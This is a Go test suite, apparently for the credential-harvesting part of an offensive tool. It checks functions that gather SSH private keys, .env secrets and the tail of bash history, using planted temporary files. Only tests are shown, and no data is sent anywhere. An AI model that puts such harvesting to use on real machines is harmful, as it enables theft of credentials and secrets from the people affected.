package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestCredsDump_LargeHistory verifies that a very large history file does not
// cause unbounded memory allocation. Only the last 30 lines should be
// included, read from at most the last 8KB of the file.
func TestCredsDump_LargeHistory(t *testing.T) {
	dir := t.TempDir()
	histPath := filepath.Join(dir, ".bash_history")

	// Write a large history file with 100,000 lines.
	f, err := os.Create(histPath)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 100000; i++ {
		f.WriteString("ls -la /some/long/path/to/make/lines/bigger\n")
	}
	f.Close()

	fi, err := os.Stat(histPath)
	if err != nil {
		t.Fatal(err)
	}
	if fi.Size() < 1_000_000 {
		t.Fatal("test history file too small")
	}

	// Read just the tail using the same logic the fix should implement.
	lines := readHistoryTail(histPath, 30)
	if len(lines) > 30 {
		t.Fatalf("want at most 30 lines, got %d", len(lines))
	}
	if len(lines) == 0 {
		t.Fatal("want some history lines, got 0")
	}
}

// TestCredsDump_SmallHistory verifies that small history files are read
// correctly (the file is smaller than the 8KB read window).
func TestCredsDump_SmallHistory(t *testing.T) {
	dir := t.TempDir()
	histPath := filepath.Join(dir, ".bash_history")

	content := "echo hello\necho world\nls\n"
	os.WriteFile(histPath, []byte(content), 0644)

	lines := readHistoryTail(histPath, 30)
	if len(lines) != 3 {
		t.Fatalf("want 3 lines, got %d: %v", len(lines), lines)
	}
	if lines[0] != "echo hello" {
		t.Fatalf("want first line 'echo hello', got %q", lines[0])
	}
}

// TestCredsDump_EmptyHistory verifies that an empty history file returns no lines.
func TestCredsDump_EmptyHistory(t *testing.T) {
	dir := t.TempDir()
	histPath := filepath.Join(dir, ".bash_history")
	os.WriteFile(histPath, []byte{}, 0644)

	lines := readHistoryTail(histPath, 30)
	if len(lines) != 0 {
		t.Fatalf("want 0 lines for empty file, got %d", len(lines))
	}
}

// TestCredsDump_NonexistentHistory verifies that a missing file returns no lines.
func TestCredsDump_NonexistentHistory(t *testing.T) {
	lines := readHistoryTail("/nonexistent_alcapwn_test_xyz", 30)
	if len(lines) != 0 {
		t.Fatalf("want 0 lines for missing file, got %d", len(lines))
	}
}

// TestCredsDump_ExactlyThirtyLines verifies boundary condition.
func TestCredsDump_ExactlyThirtyLines(t *testing.T) {
	dir := t.TempDir()
	histPath := filepath.Join(dir, ".bash_history")

	var sb strings.Builder
	for i := 0; i < 30; i++ {
		sb.WriteString("line\n")
	}
	os.WriteFile(histPath, []byte(sb.String()), 0644)

	lines := readHistoryTail(histPath, 30)
	if len(lines) != 30 {
		t.Fatalf("want 30 lines, got %d", len(lines))
	}
}

// ── harvestCredsLinux / harvestCreds ──────────────────────────────────────────

func TestHarvestCreds_DoesNotPanic(t *testing.T) {
	// harvestCreds should always succeed (it returns errors for individual
	// sections as inline text, not as a Go error).
	out, err := harvestCreds()
	if err != nil {
		t.Fatalf("harvestCreds error: %v", err)
	}
	if len(out) == 0 {
		t.Fatal("harvestCreds should return non-empty output even when no creds found")
	}
}

func TestHarvestCreds_ContainsSections(t *testing.T) {
	out, err := harvestCreds()
	if err != nil {
		t.Fatal(err)
	}
	s := string(out)
	// Every run should include these section headers.
	for _, section := range []string{"SSH PRIVATE KEYS", "ENV SECRETS", "SHELL HISTORY"} {
		if !strings.Contains(s, section) {
			t.Errorf("missing section %q in creds output", section)
		}
	}
}

func TestWalkEnvFiles_FindsPlantedEnv(t *testing.T) {
	dir := t.TempDir()
	envContent := "SECRET_KEY=abc123\nDB_PASS=hunter2\n"
	os.WriteFile(filepath.Join(dir, ".env"), []byte(envContent), 0644)

	// Nested .env.
	subdir := filepath.Join(dir, "app")
	os.MkdirAll(subdir, 0755)
	os.WriteFile(filepath.Join(subdir, ".env"), []byte("NESTED=yes\n"), 0644)

	var buf bytes.Buffer
	count := 0
	walkEnvFiles(dir, &buf, &count, 3)

	if count != 2 {
		t.Fatalf("want 2 .env files found, got %d", count)
	}
	s := buf.String()
	if !strings.Contains(s, "SECRET_KEY=abc123") {
		t.Error("missing root .env content")
	}
	if !strings.Contains(s, "NESTED=yes") {
		t.Error("missing nested .env content")
	}
}

func TestWalkEnvFiles_RespectsMaxDepth(t *testing.T) {
	dir := t.TempDir()
	// Create .env at depth 0, 1, 2, 3, 4.
	current := dir
	for i := 0; i < 5; i++ {
		os.WriteFile(filepath.Join(current, ".env"), []byte("X=Y\n"), 0644)
		current = filepath.Join(current, "sub")
		os.MkdirAll(current, 0755)
	}

	var buf bytes.Buffer
	count := 0
	walkEnvFiles(dir, &buf, &count, 2)

	// maxDepth=2 should find .env at depth 0, 1, 2 (3 files).
	if count != 3 {
		t.Fatalf("want 3 .env files within maxDepth=2, got %d", count)
	}
}

func TestWalkDir_NonexistentDir(t *testing.T) {
	// walkDir should not panic on a nonexistent directory.
	walkDir("/nonexistent_alcapwn_test_dir_xyz", 0, 3, func(path string) {
		t.Fatalf("should not visit any files, visited %q", path)
	})
}

func TestReadHistoryTail_SingleLine(t *testing.T) {
	dir := t.TempDir()
	histPath := filepath.Join(dir, "hist")
	os.WriteFile(histPath, []byte("only-one-line\n"), 0644)

	lines := readHistoryTail(histPath, 30)
	if len(lines) != 1 {
		t.Fatalf("want 1 line, got %d", len(lines))
	}
	if lines[0] != "only-one-line" {
		t.Fatalf("want 'only-one-line', got %q", lines[0])
	}
}

func TestCredSection_Format(t *testing.T) {
	var buf bytes.Buffer
	credSection(&buf, "TEST SECTION")
	s := buf.String()
	if !strings.Contains(s, "TEST SECTION") {
		t.Fatalf("credSection did not write section title, got %q", s)
	}
	if !strings.HasPrefix(s, "\n") {
		t.Fatal("credSection should start with newline")
	}
}

func TestHomeDir_ReturnsNonEmpty(t *testing.T) {
	h := homeDir()
	if h == "" {
		t.Fatal("homeDir returned empty string")
	}
}
